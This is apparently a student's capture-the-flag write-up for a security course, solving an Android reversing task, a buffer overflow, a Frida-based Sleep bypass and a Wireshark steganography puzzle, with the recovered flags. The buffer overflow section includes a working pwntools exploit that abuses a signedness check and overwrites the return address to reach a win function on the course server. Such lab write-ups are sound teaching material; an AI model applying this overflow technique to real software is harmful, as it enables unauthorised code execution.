
# Android RE

First, we'll put the apk into JADX. Looking at the AndroidManifest.xml, the only activity is vantagepoint.uncrackable.MainActivity. Looking through that, we can quickly see where the secret is checked via an if statement: 
![[Pasted image 20251210195719.png]]
Following this down to myApplier, we see a long function call, then returning the String result of that function call. ![[Pasted image 20251210195829.png]]
myEncoder is defined below in the same file: ![[Pasted image 20251210195855.png]]
and myCipher is defined separately: 
![[Pasted image 20251210195915.png]]

Assembling all those functions together in a single java file, and then running that file and printing out the result (new String(bArrMyCipher)), gives us the flag **hacs408e{I want to believe}**. 
# Buffer Overflow

This is a standard buffer overflow exploit (they even tell us how much to overflow and where the win() function is), with two  little twists: 
- There's a fairly weak check to see that we're not overflowing the buffer. However, we can get around this by passing in a large positive number for our buffer length, which due to twos-complement, will be treated as a large negative number, allowing us to write however much we want. We'll pass in $2^{31} + 7$ (7 isn't necessary, I just felt like it), since this value is stored using eax which is a 32 bit register, and thus can hold a maximum positive value of $2^{31}$. 
![[Pasted image 20251210225922.png]]
- The win function address contains a 0x16 character, which we need to include when communicating over the network with. This is treated as the [SYN (synchronous idle) control character](https://www.ascii-code.com/character/%E2%90%96) when read over nc, not the actual byte 0x16. To resolve this, we'll just send 0x16 twice, which effectively "escapes" the byte. Full exploit below: 
```python
from pwn import *
path = "./finalchall.bin"
e = ELF(path)
p = remote("ctf.hacs408e.net", 11000)
p.sendline(b"2147483655")
offset = 104
payload = b'A' * offset
payload += b'\xa9\x16\x16\x40\x00\x00\x00\x00\x00' # Send in little-endian, with escape
p.sendline(payload)
p.interactive()

```

This gives us the flag **hacs408e{reversing_is_Tota11y_fuN!!}**
# Dynamic Analysis

On running the function, we see that it hangs indefinitely. This seems like some sort of sleep call. Since this is a Windows binary, that call would be accomplished through the Sleep() function in KERNEL32.DLL. We'll run 
`frida-trace -i "Sleep" -f challenge.exe` just to confirm that function's being called. It is, so we'll use the conveniently-generated Sleep.js script, modifying its onEnter to include args[0] = ptr("0x1"), which will make the function Sleep for only 1ms by setting its first argument to be 1 (in ms according to [Microsoft](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep) documentation). Great! Now, running the frida-trace command again, we'll see a string of Base64-encoded text print out; on decoding it, we get the flag **picoCTF{w4ke_m3_up_w1th_fr1da_f27acc38}**

![[Pasted image 20251210201149.png]]
# Wireshark 2


Looking through UDP packets in the pcap, we see that nearly all of it consists of messages sent on port 5000. This changes around packet 1106, where the port numbers start varying, but all stay close to 5000. In particular, packet 1104 contains the word "start" in its payload, and packet 1106 has the source port value 5112, and the destination port value of 22. Curiously, 5112 - 5000 = 112 = p. Since we know this is a picoctf challenge, this might be the start of our flag. So, we'll go through all UDP packets after 1104 with a destination port of 22, subtract 5000 from their source port numbers, and convert the resulting number into an ascii character. To confirm our suspicions, packet 1303 has the payload text end, and the packet before it had a source port of 5125, and 5125-5000 = 125, or the ascii number of the right curly brace. 

I'm sad to say I did this conversion process all manually (exporting into a csv, then copying into a text file, then doing the subtraction and converting into ascii), giving the flag **picoCTF{p1LLf3r3d_data_v1a_st3g0}**. 